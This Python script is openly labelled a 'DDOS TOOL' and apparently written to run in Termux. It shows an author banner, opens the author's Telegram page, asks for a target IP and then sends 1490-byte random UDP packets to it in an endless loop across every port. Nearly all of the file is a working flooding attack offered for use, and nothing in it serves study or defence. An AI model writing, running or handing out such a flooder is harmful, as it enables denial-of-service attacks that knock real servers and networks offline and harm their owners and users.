import os
import random
import socket
import time
from colorama import Fore, Style, init
os.system("clear")
# Colorama initialize
init(autoreset=True)

# Clear screen
os.system("clear")

# Logo & Header
print("""\033[1;32m
  ____  ___    ____  ______  __
 / __ \/   |  / __ )/ __ ) \/ /
/ /_/ / /| | / __  / __  |\  / 
/ _, _/ ___ |/ /_/ / /_/ / / /  
/_/ |_/_/  |_/_____/_____/ /_/   

\033[0m\033[1;36m""" + "-"*48)

# Profile Info
print("\033[0m\033[1;33m👑 Owner   : \033[1;37mRabby")
print("\033[0m\033[1;33m💻 Github  : \033[1;37mRabby-152")
print("\033[0m\033[1;33m📘 Facebook: \033[1;37mMd Rabby")
print("\033[0m\033[1;36m" + "-"*48)

# Facebook follow prompt
print("\033[0m\033[1;35m📢 FOLLOW MY TELEGRAM:")
time.sleep(2)

# Horizontal line
print("\033[0m\033[1;36m" + "-"*48)

# Wait for user input
input("\033[1;33m[•] PRESS ENTER TO CONTINUE...\033[0m")

# Open Facebook profile
os.system("termux-open-url https://t.me/RABBY_VAI152")
def menu():
    print(Fore.CYAN + "====================================")
    print(Fore.YELLOW + "      🔥  DDOS TOOL MENU  🔥")
    print(Fore.CYAN + "====================================")
    print(Fore.GREEN + "1️⃣  DDOS ATTACK ")
    print(Fore.RED + "2️⃣  EXIT")
    print(Fore.CYAN + "============================") 
sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
byte_data=random._urandom(1490)
def ddos_attack():
	ab = input(Fore.YELLOW + "🌐 Enter Target Web Link: ")
	ip = input(Fore.YELLOW + "🔢 Enter Target Ip: ")
	sent=0
	port=0
	while True:
		port+=1
		sock.sendto(byte_data,(ip,port))
		sent+=1	
		print(Fore.GREEN + f"✅ [{sent}] Successfully 'sent' packet to {ip}:{port}")
		if port==65535:
			port=0				
while True:
    menu()
    choice = input(Fore.YELLOW + "👉 Enter your choice: ")
    if choice == "1":
        try:
               ddos_attack()
        except KeyboardInterrupt:
            print(Fore.RED + "\n⛔ Attack Finished!\n")
    elif choice == "2":
        print(Fore.RED + "👋 Exiting... Bye!")
        break
    else:
        print(Fore.RED + "❌ Invalid choice, try again!\n")
       